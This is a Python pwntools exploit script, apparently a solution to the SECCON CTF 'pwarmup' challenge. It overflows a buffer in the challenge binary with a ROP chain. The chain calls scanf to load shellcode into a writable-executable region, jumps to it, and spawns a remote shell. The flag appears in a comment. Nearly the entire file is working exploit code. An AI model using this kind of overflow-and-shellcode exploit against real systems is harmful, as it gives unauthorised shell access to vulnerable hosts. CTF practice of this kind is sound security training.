#!/usr/bin/env python3
from pwn import *

BINARY = 'pwarmup/chall'


def connect():
    if args.LOCAL:
        return gdb.debug([BINARY], gdbscript='''
b *0x400707
c
''')
    else:
        return remote('pwn-neko.chal.seccon.jp', 9001)


def main():
    context.arch = 'amd64'
    percent_s = 0x40081B
    rwx = 0x600000
    rop = ROP([ELF(BINARY)])
    rop.call('__isoc99_scanf', [percent_s, rwx])
    rop.raw(rwx)
    rop = rop.chain()
    shellcode = asm(
        '''mov rax, 31
        inc rax
        xor rdi, rdi
        syscall
''' +
        shellcraft.amd64.linux.sh(),
        arch='amd64')
    #main_addr = 0x4006B7
    #puts_plt_addr = 0x400580
    #pop_rdi_ret_addr = 0x4007e3
    #puts_got_addr = 0x4006B7  # 0x600BB8
    whitespace = b'\x0a\x0b\x20'
    assert all(c not in rop for c in whitespace)
    assert all(c not in shellcode for c in whitespace)
    with connect() as tube:
        tube.sendline(flat({0x28: rop}))
        tube.sendline(shellcode)
        tube.interactive()  # SECCON{1t's_g3tt1ng_c0ld_1n_j4p4n_d0n't_f0rget_t0_w4rm-up}


if __name__ == '__main__':
    main()
